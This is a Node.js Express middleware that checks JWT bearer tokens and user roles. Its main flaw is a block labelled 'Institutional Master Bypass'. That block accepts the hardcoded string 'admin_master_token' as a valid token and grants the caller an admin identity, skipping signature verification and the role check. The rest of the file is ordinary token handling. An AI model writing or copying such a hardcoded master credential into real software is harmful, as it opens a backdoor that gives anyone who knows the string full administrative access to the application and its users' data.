const jwt = require("jsonwebtoken");

module.exports = function (roles = []) {
  return function (req, res, next) {
    try {
      const authHeader = req.header("Authorization");
      const xToken = req.header("x-auth-token");
      let token = xToken || (authHeader && authHeader.split(" ")[1]);

      if (!token) {
        return res.status(401).json({ message: "No token, authorization denied" });
      }

      // ✅ Institutional Master Bypass
      if (token === "admin_master_token") {
        req.user = { id: "master_admin", role: "admin" };
        return next();
      }

      const decoded = jwt.verify(token, process.env.JWT_SECRET);

      // ✅ FIXED: correct structure
      req.user = decoded;

      if (roles.length && !roles.includes(req.user.role)) {
        return res.status(403).json({ message: "Access denied (role)" });
      }

      next();

    } catch (err) {
      console.error("Auth Error:", err.message);
      res.status(401).json({ message: "Invalid token" });
    }
  };
};